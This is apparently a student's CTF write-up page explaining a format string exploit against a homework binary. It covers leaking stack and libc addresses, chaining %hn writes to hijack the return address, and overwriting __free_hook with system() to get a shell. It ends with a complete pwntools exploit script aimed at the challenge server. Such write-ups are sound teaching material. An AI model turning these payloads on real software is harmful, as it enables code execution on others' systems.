@@ -1,0 +1,141 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><link rel=stylesheet href=/markdown.css><link rel=stylesheet href=/highlight.css><title>Homework 10a Writeup (without giveup()) | CTF Writeups</title>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js crossorigin=anonymous></script><script>window.onload=()=>renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})</script></head><script>addEventListener("load",()=>{console.log("nothing to see here yo")},!1)</script><body><article class=container><div class=title>Homework 10a Writeup (without giveup())</div><div class=date>Dec 18, 2023</div><figure><img src=/hw10a/image-1.png alt=bruh><figcaption aria-hidden=true>bruh</figcaption></figure><h2 id=a-quick-look>A Quick Look</h2><figure><img src=/hw10a/image-2.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>Sums up every CTF challenge so far <img src=https://blob.cat/emoji/custom/blobcats/blobcatgooglytrash.png alt=emoji></p><p>As a rule of thumb we will run <code>checksec</code> on the
+binary:</p><figure><img src=/hw10a/image-6.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>Looks scary <img src=https://blob.cat/emoji/custom/blobcats/ablobcatsweatsiphard.gif alt=emoji></p><p>The vulnerability could be easily found in the source code if you’re
+using the <code>clangd</code> lauguage server in your editor:</p><figure><img src=/hw10a/image-4.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>It reads the “name of the snack” into a buffer <span class=spoiler>in the heap</span> then <code>printf</code>s it as the
+format string itself. It appears to be an easy format string attack
+challenge. We will try some generic payloads:</p><figure><img src=/hw10a/image-5.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>Looks like we got some addresses on the stack to bypass ASLR <img src=https://blob.cat/emoji/custom/blobcats/blobcatglowsticks.png alt=emoji>. Now we have to figure out how to do our abritrary write,
+so that we can overwrite the GOT entry of a libc function with the
+address of <code>system()</code>.</p><h2 id=where-did-my-payload-go-emoji>Where did my payload go <img src=https://blob.cat/emoji/custom/blobcats/blobcatsob.png alt=emoji></h2><p>Let’s run it on <code>gdb</code> and see what the stack looks like
+when we enter our payload:</p><figure><img src=/hw10a/image-7.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>The text we entered is nowhere to be found on the stack. But we can
+see a pointer to our payload <code>AAAA...</code> on the
+<strong>heap</strong>. If we look back at the source code, we can see
+that the <code>buffer</code> string is allocated on the heap using
+<code>malloc()</code>.</p><p>But in order to execute an abritrary write using format strings (and
+the <code>%n</code> format specifier), the address to be written is
+specified at an argument, meaning it must also be on the stack. If we
+tried use <code>fmtstr_payload()</code> from pwntools, it will just
+write to the location pointed by some pointers on the stack.</p><p>How about the <code>name</code> buffer at the start of the program?
+Can we put the target addresses into it? It is indeed stored on the
+stack, but <strong>before</strong> we can leak our address from the
+buffer to bypass ASLR. If we manage to modify it <em>after</em> we leak
+the address, then we could do the abritrary write. But how?</p><p>Is there a good way to return to the <code>ctf_simulator</code>
+function, without calling <code>giveup()</code>? Well, to <em>control
+the flow</em>, we could only overwrite either a GOT entry, or the return
+address of the function at <code>rbp+1</code>. Back to square one <img src=https://blob.cat/emoji/custom/blobcats/blobcatangery.png alt=emoji></p><h2 id=chaining-the-overwrites>Chaining the overwrites</h2><p>A trick I learned from <a href=/hkcert#mips-rop-gldanoob>the MIPS
+ROP challenge</a> is to make use of the existing values on the stack
+which are deterministic. In this case it means we can utilize those
+pointer values to control another value on the stack. For example, the
+value at <code>rbp</code> (<code>0x7fffffffd650</code>) refers to the
+saved <code>rbp</code> (<code>rbp + 0x120</code>), which points to the
+base of the previous stack frame. What if we used the format string
+exploit with the pointer at <code>rbp</code>? The value at base of the
+previous stack frame (which also is a pointer to the stack) get
+overwritten.</p><pre><code>[rbp] (8th arg)  -&gt; rbp + 0x120
+...
+(Stack frame of ctf_simulator())
+...
+[rbp + 0x120]     -&gt; 0x7fffffffd780</code></pre><p>Let’s try overwriting it with the format specifier
+<code>%1c%8$hn</code> (writing <code>0x0001</code> to the address
+pointed by the 8th argument):</p><pre><code>[rbp + 0x120] -&gt; 0x7fffffff0001</code></pre><p>We have another address on the stack, differing from the previous by
+the lower bytes (first two bytes in memory). What makes it even better
+is that we can just make it point to <code>rbp+1</code>, by just
+altering those two bytes with <code>%54872c%10$hn</code>:</p><pre><code>[rbp + 0x120] -&gt; 0x7fffffffd658 = rbp + 1</code></pre><p>(The exact value of <code>rbp</code> can be calculated using the
+leaked stack address from earlier)</p><p>Now we have a pointer to the return address (<code>rbp + 1</code>) on
+the stack! Using it as the argument to the format string exploit, we can
+overwrite the return address with <code>ctf_simulator</code> using the
+same trick:</p><pre><code>[rbp + 1]     -&gt; ctf_simulator()
+...
+[rbp + 0x120] -&gt; rbp + 1</code></pre><p>Now the program will ask us for the team name again once the
+<code>get_snack</code> function exits.</p><h2 id=full-relro-or-not>Full RELRO… or not?</h2><p>Now that we had our abritary overwrite using the <code>name</code>
+buffer, we can use the leaked address from earlier to calculate the
+address of the GOT table, and leak the address of <code>puts()</code> in
+memory with <code>%10$s</code>, thus obtaining the address of
+<code>system()</code>:</p><p><img src=/hw10a/image-9.png></p><p>However there is a problem: the binary is compiled with full RELRO,
+meaning the GOT table is read-only. We can’t simply overwrite any GOT
+entry with the address of <code>system()</code>. But if we’re lucky and
+the LIBC version on the server is older, there’s a chance the LIBC calls
+a function pointer <code>__free_hook</code> (which can be user defined)
+when freeing chunks on the heap.</p><p>We can check the LIBC version using <a href=https://libc.blukat.me/ class=uri>https://libc.blukat.me/</a> with our leaked address:</p><figure><img src=/hw10a/image-8.png alt="Alt text"><figcaption aria-hidden=true>Alt text</figcaption></figure><p>The LIBC version is older than 2.34, so we can use the
+<code>__free_hook</code> trick and overwrite it with the address of
+<code>system()</code> <img src=https://blob.cat/emoji/custom/blobcats/blobcatglowsticks.png alt=emoji>. We’ll use the <code>name</code> buffer again, since the
+output of <code>fmtstr_payload()</code> has to be on the stack.</p><p>One last thing is to get <code>system()</code> to be called with the
+argument <code>/bin/sh</code>. But since whatever is being freed is also
+passed to <code>__free_hook</code>, which in this case happenes to be
+<code>buffer</code>, we can just put <code>/bin/sh</code> as the name of
+our snack.</p><h2 id=solution>Solution</h2><ol type=1><li>Leak the base address of the binary and the saved RBP</li><li>Using two format string exploits, overwrite the return address of
+the <code>get_snacks()</code> call with <code>ctf_simulator</code></li><li>Leak the address of <code>puts()</code> by setting <code>name</code>
+to <code>puts@GOT</code> and calculate the address of
+<code>system()</code></li><li>Return to <code>ctf_simulator</code> again, set
+<code>__free_hook</code> to the address of <code>system()</code></li><li>Enter <code>/bin/sh</code> as the name of the snack, wait for
+<code>buffer</code> to be freed and <code>cat flag.txt</code></li></ol><div class=sourceCode id=cb5><pre class="sourceCode py"><code class="sourceCode python"><span id=cb5-1><a href=#cb5-1 aria-hidden=true tabindex=-1></a><span class=im>import</span> sys</span>
+<span id=cb5-2><a href=#cb5-2 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-3><a href=#cb5-3 aria-hidden=true tabindex=-1></a><span class=im>from</span> pwn <span class=im>import</span> <span class=op>*</span>  <span class=co># type: ignore</span></span>
+<span id=cb5-4><a href=#cb5-4 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-5><a href=#cb5-5 aria-hidden=true tabindex=-1></a>mode <span class=op>=</span> <span class=st>&#39;l&#39;</span></span>
+<span id=cb5-6><a href=#cb5-6 aria-hidden=true tabindex=-1></a><span class=cf>if</span> <span class=bu>len</span>(sys.argv) <span class=op>&gt;</span> <span class=dv>1</span>:</span>
+<span id=cb5-7><a href=#cb5-7 aria-hidden=true tabindex=-1></a>    mode <span class=op>=</span> sys.argv[<span class=dv>1</span>]</span>
+<span id=cb5-8><a href=#cb5-8 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-9><a href=#cb5-9 aria-hidden=true tabindex=-1></a>e <span class=op>=</span> ELF(<span class=st>&#39;./ctf_sim&#39;</span>)</span>
+<span id=cb5-10><a href=#cb5-10 aria-hidden=true tabindex=-1></a>libc <span class=op>=</span> ELF(<span class=st>&#39;./libc.so.6&#39;</span>)</span>
+<span id=cb5-11><a href=#cb5-11 aria-hidden=true tabindex=-1></a>context.binary <span class=op>=</span> e</span>
+<span id=cb5-12><a href=#cb5-12 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-13><a href=#cb5-13 aria-hidden=true tabindex=-1></a><span class=cf>if</span> mode <span class=op>==</span> <span class=st>&#39;r&#39;</span>:</span>
+<span id=cb5-14><a href=#cb5-14 aria-hidden=true tabindex=-1></a>    p <span class=op>=</span> <span class=ex>connect</span>(<span class=st>&#39;chal.firebird.sh&#39;</span>, <span class=dv>35048</span>)</span>
+<span id=cb5-15><a href=#cb5-15 aria-hidden=true tabindex=-1></a><span class=cf>else</span>:</span>
+<span id=cb5-16><a href=#cb5-16 aria-hidden=true tabindex=-1></a>    p <span class=op>=</span> process([e.path])</span>
+<span id=cb5-17><a href=#cb5-17 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-18><a href=#cb5-18 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-19><a href=#cb5-19 aria-hidden=true tabindex=-1></a>p.sendline(<span class=st>b&#39;AAAAAAAAAAAAAAAAA&#39;</span>)</span>
+<span id=cb5-20><a href=#cb5-20 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-21><a href=#cb5-21 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-22><a href=#cb5-22 aria-hidden=true tabindex=-1></a><span class=kw>def</span> ret_to_ctf():</span>
+<span id=cb5-23><a href=#cb5-23 aria-hidden=true tabindex=-1></a>    <span class=co># after leaking rbp and setting e.address</span></span>
+<span id=cb5-24><a href=#cb5-24 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-25><a href=#cb5-25 aria-hidden=true tabindex=-1></a>    <span class=co># rbp $8 -&gt; rbp+0x120 $44 -&gt; rbp+0x130</span></span>
+<span id=cb5-26><a href=#cb5-26 aria-hidden=true tabindex=-1></a>    <span class=co># make rbp+0x120 point to return address (rbp+8)</span></span>
+<span id=cb5-27><a href=#cb5-27 aria-hidden=true tabindex=-1></a>    p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-28><a href=#cb5-28 aria-hidden=true tabindex=-1></a>    payload <span class=op>=</span> <span class=st>&#39;%</span><span class=sc>{}</span><span class=st>c%</span><span class=sc>{}</span><span class=st>$hn&#39;</span>.<span class=bu>format</span>((rbp <span class=op>+</span> <span class=dv>8</span>) <span class=op>&amp;</span> <span class=bn>0xffff</span>, <span class=dv>8</span>)</span>
+<span id=cb5-29><a href=#cb5-29 aria-hidden=true tabindex=-1></a>    p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, payload)</span>
+<span id=cb5-30><a href=#cb5-30 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-31><a href=#cb5-31 aria-hidden=true tabindex=-1></a>    <span class=co># edit return address to start of ctf_simulator</span></span>
+<span id=cb5-32><a href=#cb5-32 aria-hidden=true tabindex=-1></a>    p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-33><a href=#cb5-33 aria-hidden=true tabindex=-1></a>    payload <span class=op>=</span> <span class=st>&#39;%</span><span class=sc>{}</span><span class=st>c%</span><span class=sc>{}</span><span class=st>$hn&#39;</span>.<span class=bu>format</span>(e.sym[<span class=st>&#39;ctf_simulator&#39;</span>] <span class=op>+</span> <span class=dv>15</span> <span class=op>&amp;</span> <span class=bn>0xffff</span>, <span class=dv>44</span>)</span>
+<span id=cb5-34><a href=#cb5-34 aria-hidden=true tabindex=-1></a>    p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, payload)</span>
+<span id=cb5-35><a href=#cb5-35 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-36><a href=#cb5-36 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-37><a href=#cb5-37 aria-hidden=true tabindex=-1></a><span class=co># Leak RBP of ctf_simulator &amp; Return address</span></span>
+<span id=cb5-38><a href=#cb5-38 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-39><a href=#cb5-39 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, <span class=st>b&#39;%8$payo%9$pez&#39;</span>)</span>
+<span id=cb5-40><a href=#cb5-40 aria-hidden=true tabindex=-1></a>p.recvuntil(<span class=st>b&#39;0x&#39;</span>)</span>
+<span id=cb5-41><a href=#cb5-41 aria-hidden=true tabindex=-1></a>rbp <span class=op>=</span> <span class=bu>int</span>(p.recvuntil(<span class=st>&#39;ayo&#39;</span>, drop<span class=op>=</span><span class=va>True</span>).strip(), <span class=dv>16</span>) <span class=op>-</span> <span class=bn>0x120</span></span>
+<span id=cb5-42><a href=#cb5-42 aria-hidden=true tabindex=-1></a>ret <span class=op>=</span> <span class=bu>int</span>(p.recvuntil(<span class=st>&#39;ez&#39;</span>, drop<span class=op>=</span><span class=va>True</span>).strip(), <span class=dv>16</span>)</span>
+<span id=cb5-43><a href=#cb5-43 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&#39;RBP: &#39;</span>, <span class=bu>hex</span>(rbp))</span>
+<span id=cb5-44><a href=#cb5-44 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&#39;Return address: &#39;</span>, <span class=bu>hex</span>(ret))</span>
+<span id=cb5-45><a href=#cb5-45 aria-hidden=true tabindex=-1></a><span class=co># Set the base address of ELF</span></span>
+<span id=cb5-46><a href=#cb5-46 aria-hidden=true tabindex=-1></a>e.address <span class=op>=</span> ret <span class=op>-</span> e.sym[<span class=st>&#39;ctf_simulator&#39;</span>] <span class=op>-</span> <span class=dv>166</span></span>
+<span id=cb5-47><a href=#cb5-47 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-48><a href=#cb5-48 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-49><a href=#cb5-49 aria-hidden=true tabindex=-1></a>ret_to_ctf()</span>
+<span id=cb5-50><a href=#cb5-50 aria-hidden=true tabindex=-1></a>p.pack(e.got[<span class=st>&#39;puts&#39;</span>])</span>
+<span id=cb5-51><a href=#cb5-51 aria-hidden=true tabindex=-1></a>p.sendline()</span>
+<span id=cb5-52><a href=#cb5-52 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-53><a href=#cb5-53 aria-hidden=true tabindex=-1></a><span class=co># Leak puts</span></span>
+<span id=cb5-54><a href=#cb5-54 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-55><a href=#cb5-55 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, <span class=st>b&#39;%10$sAAAA&#39;</span>)</span>
+<span id=cb5-56><a href=#cb5-56 aria-hidden=true tabindex=-1></a>puts <span class=op>=</span> unpack(p.recvuntil(<span class=st>&#39;AAAA&#39;</span>, drop<span class=op>=</span><span class=va>True</span>), <span class=st>&#39;all&#39;</span>)</span>
+<span id=cb5-57><a href=#cb5-57 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&#39;PUTS: &#39;</span>, <span class=bu>hex</span>(puts))</span>
+<span id=cb5-58><a href=#cb5-58 aria-hidden=true tabindex=-1></a>libc.address <span class=op>=</span> puts <span class=op>-</span> libc.sym[<span class=st>&#39;puts&#39;</span>]</span>
+<span id=cb5-59><a href=#cb5-59 aria-hidden=true tabindex=-1></a>hook <span class=op>=</span> libc.sym[<span class=st>&#39;__free_hook&#39;</span>]</span>
+<span id=cb5-60><a href=#cb5-60 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&#39;HOOK: &#39;</span>, <span class=bu>hex</span>(hook))</span>
+<span id=cb5-61><a href=#cb5-61 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-62><a href=#cb5-62 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-63><a href=#cb5-63 aria-hidden=true tabindex=-1></a>ret_to_ctf()</span>
+<span id=cb5-64><a href=#cb5-64 aria-hidden=true tabindex=-1></a><span class=co># Overwrite __free_hook with system</span></span>
+<span id=cb5-65><a href=#cb5-65 aria-hidden=true tabindex=-1></a>payload <span class=op>=</span> fmtstr_payload(<span class=dv>10</span>, {hook: libc.sym[<span class=st>&#39;system&#39;</span>]})</span>
+<span id=cb5-66><a href=#cb5-66 aria-hidden=true tabindex=-1></a>p.sendline(payload)</span>
+<span id=cb5-67><a href=#cb5-67 aria-hidden=true tabindex=-1></a></span>
+<span id=cb5-68><a href=#cb5-68 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-69><a href=#cb5-69 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, payload)</span>
+<span id=cb5-70><a href=#cb5-70 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;option: &#39;</span>, <span class=st>b&#39;3&#39;</span>)</span>
+<span id=cb5-71><a href=#cb5-71 aria-hidden=true tabindex=-1></a>p.sendlineafter(<span class=st>b&#39;today? &#39;</span>, <span class=st>&#39;/bin/sh</span><span class=ch>\x00</span><span class=st>&#39;</span>)</span>
+<span id=cb5-72><a href=#cb5-72 aria-hidden=true tabindex=-1></a>p.interactive()</span></code></pre></div><footer><span class=static>Powered by <a href=https://gohugo.io/>Hugo</a></span><br><span class=static>Emojis from <a href=https://blob.cat/>blob.cat</a></span></footer></article></body></html>
